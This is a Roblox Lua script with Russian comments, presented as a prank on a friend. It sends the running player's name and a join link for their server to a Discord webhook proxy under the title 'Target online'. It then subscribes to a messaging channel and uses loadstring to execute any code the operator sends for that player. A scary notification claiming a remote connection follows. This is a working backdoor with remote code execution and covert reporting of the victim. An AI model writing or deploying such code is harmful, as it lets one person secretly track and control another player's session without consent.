local HttpService = game:GetService("HttpService")
local MessagingService = game:GetService("MessagingService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- ⚠️ ЗАМЕНИТЕ НА ВАШ ПРОКСИ-ВЕБХУК ДИСКОРДА
local webhookUrl = "https://lewisakura.moe"

-- 1. Сбор и отправка данных в Discord (чтобы вы узнали, что он зашел)
local joinLink = "roblox://placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
local payload = {
    ["embeds"] = {{
        ["title"] = "👁️ Цель в сети!",
        ["description"] = "Друг запустил скрипт. Теперь вы можете отправлять ему команды из Studio.",
        ["color"] = 16711680,
        ["fields"] = {
            {["name"] = "Ник:", ["value"] = player.Name, ["inline"] = true},
            {["name"] = "Ссылка для входа:", ["value"] = "```" .. joinLink .. "```", ["inline"] = false}
        }
    }}
}

pcall(function()
    HttpService:PostAsync(webhookUrl, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
end)

-- 2. Подключаемся к каналу связи "PrankChannel"
-- Этот код будет ждать, пока вы из Studio что-то пришлете
pcall(function()
    MessagingService:SubscribeAsync("PrankChannel", function(message)
        local commandData = message.Data -- Получаем отправленные данные
        
        -- Проверяем, что команда предназначена именно для этого игрока
        if commandData.TargetUser == player.Name then
            -- Выполняем код, который вы прислали из Studio
            local runCode = loadstring(commandData.ScriptToRun)
            if runCode then
                runCode()
            end
        end
    end)
end)

-- Пугающее уведомление в игре
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "⚠️ СИСТЕМА ИНТЕГРАЦИИ",
    Text = "Успешное подключение к удаленному серверу.",
    Duration = 5
})
